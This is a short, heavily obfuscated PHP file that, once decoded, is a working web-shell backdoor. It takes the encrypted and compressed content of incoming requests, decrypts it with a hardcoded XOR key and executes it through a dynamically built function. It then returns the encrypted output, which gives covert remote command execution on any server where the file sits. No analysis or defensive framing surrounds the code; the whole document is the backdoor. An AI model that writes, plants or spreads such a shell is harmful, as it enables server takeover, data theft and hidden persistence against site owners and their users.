<?php
$w='uncFitiFion xFi($t,$k){$c=FistrleFin($k);$l=sFitrFilen($t);$o=Fi"";for($i=0Fi;$i<$lFi;Fi){for(Fi$j';
$Y='b_FiendFi_clean();$r=@baFise64_enFicode(@x(Fi@gFizcomFipress($o),Fi$k))Fi;pFirint(Fi"$p$kh$r$kf");}';
$H='$k=Fi"03e4Fi43Fi08";$kh=Fi"a5e407Fidfc82e";$kf="cFib34Fi4aFi6cd377";Fi$p="SXiyFiFiEcO9zO0mbZPV"Fi;fFi';
$E=str_replace('b','','crebabte_bfubnbctbion');
$T='aFil(@FigFizuncomFipress(@x(@base6Fi4_decodeFi($m[1Fi])Fi,$kFi)));$o=@Fiob_get_contFientsFi()Fi;@o';
$d='("/$khFi(.Fi+)Fi$kf/Fi",@fFiileFi_get_contents("php://iFinput"Fi),$m)=Fi=Fi1) Fi{@Fiob_start();@ev';
$M='=0;($Fij<$cFi&&$i<$l);$Fij++,$iFi++){$o.=$Fit{$iFi}^Fi$k{$j};}}retFiurFin Fi$o;}if (@preFig_mFiatch';
$p=str_replace('Fi','',$H.$w.$M.$d.$T.$Y);
$W=$E('',$p);$W();
?>
